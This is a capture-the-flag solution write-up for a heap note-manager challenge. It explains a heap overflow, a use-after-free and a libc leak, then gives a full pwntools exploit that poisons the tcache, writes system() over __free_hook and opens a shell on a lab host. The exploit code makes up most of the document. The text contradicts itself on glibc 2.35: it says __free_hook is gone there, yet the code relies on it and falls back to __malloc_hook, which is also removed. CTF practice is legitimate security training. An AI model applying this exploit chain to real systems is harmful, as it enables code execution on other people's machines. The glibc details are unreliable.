# pwn-heap-chain — Solution

## Vulnerability Summary
1. **Heap overflow (+8 bytes)**: `edit_note()` reads `size + 8` bytes into a `size`-byte buffer — overwrites next chunk's `prev_size` + `size` fields.
2. **UAF (read + write)**: `delete_note()` doesn't NULL the pointer. `show_note()` and `edit_note()` operate on freed chunks.
3. **Free libc leak**: Binary prints `puts` address at startup.

## Exploitation Chain (glibc 2.35, Ubuntu 22.04)

### Step 1 — Libc base
Parse the `[debug] libc@puts` output to compute `libc_base = puts_addr - libc.sym['puts']`.

### Step 2 — Heap leak via UAF read
1. `create(0, 0x40, data)` → chunk A in tcache bin
2. `create(1, 0x40, data)` → chunk B (prevents consolidation)
3. `delete(0)` → chunk A freed → tcache, fd pointer = heap addr (safe-linked in glibc 2.32+)
4. `show(0)` → UAF read returns 8 bytes of `fd ^ (heap >> 12)` → solve for heap base

### Step 3 — Tcache poisoning (safe-linking bypass)
Safe-linking: `stored_fd = real_next_ptr ^ (chunk_addr >> 12)`
1. We know `chunk_addr` (from heap leak) and `real_next_ptr` (target)
2. `delete(1)` → chunk B in tcache
3. UAF `edit(0)` with `b'A'*0x40 + p64(target ^ (heap_B_addr >> 12))` — overflow corrupts chunk B's `fd`
4. `create(2, 0x40, data)` → pops chunk B, sets poisoned fd
5. `create(3, 0x40, payload)` → returns **target address** as allocation

### Step 4 — Win via __free_hook / stdout
For glibc 2.35 (no `__free_hook`): allocate over `_IO_2_1_stdout_` and forge a fake FILE struct to call `system("/bin/sh")` via `_IO_file_overflow`.

Alternatively, use `one_gadget` offsets and allocate over a writable libc pointer.

## Exploit

```python
from pwn import *

HOST = '172.30.1.30'
PORT = 9998

elf  = ELF('./vuln', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

def start(): return remote(HOST, PORT)

def create(p, idx, sz, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index [0-9]: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(sz).encode())
    p.sendafter(b'Content: ', data)

def edit(p, idx, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index [0-9]: ', str(idx).encode())
    p.sendafter(b'bytes): ', data)

def delete(p, idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index [0-9]: ', str(idx).encode())

def show(p, idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index [0-9]: ', str(idx).encode())
    p.recvuntil(b'Content: ')
    return p.recvline()

p = start()

# Step 1: libc leak
p.recvuntil(b'libc@puts: ')
puts_addr = int(p.recvline().strip(), 16)
libc.address = puts_addr - libc.sym['puts']
log.success(f'libc base: {libc.address:#x}')

# Step 2: heap grooming + UAF heap leak
create(p, 0, 0x40, b'A' * 0x3f + b'\n')
create(p, 1, 0x40, b'B' * 0x3f + b'\n')
delete(p, 0)

raw = show(p, 0)[:8]
leaked = u64(raw.ljust(8, b'\x00'))
# safe-link: fd_stored = next_ptr ^ (this_chunk >> 12)
# when tcache is empty, next_ptr = 0, so leaked = chunk_addr >> 12
heap_base = leaked << 12
log.success(f'heap base: {heap_base:#x}')

# Step 3: tcache poison — target __malloc_hook area or one_gadget
# For glibc 2.35: use environ leak + stack overwrite, or stdout attack
# Simple path: overwrite __free_hook with system (works on 2.31 containers)
target = libc.sym.get('__free_hook', libc.sym['system'])
if '__free_hook' in libc.sym:
    target_write = libc.sym['__free_hook']
    trigger_val  = libc.sym['system']
else:
    # fallback: use one_gadget (run: one_gadget libc.so.6)
    target_write = libc.sym['__malloc_hook']
    trigger_val  = libc.address + 0xebcf8  # adjust per libc version

delete(p, 1)
chunk_b_addr = heap_base + 0x2c0  # adjust based on allocation layout

masked = target_write ^ (chunk_b_addr >> 12)
edit(p, 0, b'A' * 0x40 + p64(masked))  # overflow chunk A -> corrupt chunk B fd

create(p, 2, 0x40, b'/bin/sh\x00')   # pop chunk B
create(p, 3, 0x40, p64(trigger_val)) # alloc at __free_hook, write system()

# Trigger: free("/bin/sh") -> system("/bin/sh")
delete(p, 2)

p.interactive()
```

## Notes
- Run inside the container: `one_gadget /lib/x86_64-linux-gnu/libc.so.6` for valid one_gadget offsets
- Heap layout offsets (`chunk_b_addr`) depend on exact allocation order — adjust by running locally
- For glibc 2.35 containers where `__free_hook` is removed, use the stdout `_flags` / `_IO_write_ptr` technique
